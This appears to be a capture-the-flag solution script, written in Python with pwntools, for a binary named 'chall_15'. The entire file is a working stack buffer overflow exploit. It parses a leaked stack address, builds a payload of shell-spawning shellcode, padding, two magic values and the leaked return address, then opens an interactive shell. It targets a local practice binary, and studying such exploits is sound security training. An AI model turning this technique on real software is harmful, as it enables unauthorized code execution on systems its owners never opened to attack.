# exploit a buffer overflow to inject shellcode onto the stack, then pass the correct arguments to be able to jump to the leaked address of the stack and execute the shellcode.
from pwn import *

elf = ELF("./chall_15")

p = process("./chall_15")

p.recvuntil(b"0x")

stack = p64(int(b"0x" + p.recvuntil(b"\n")[0:-1], 16))

context.arch = "amd64"
shellcode_bytes = asm(shellcraft.sh())

var1 = p32(0xb16b00b5)
var2 = p32(0xdeadd00d)

payload = shellcode_bytes + b"A" * (280 - len(shellcode_bytes)) + var2 + var1 + b"JUNKJUNK" + stack

p.sendline(payload)

p.interactive()
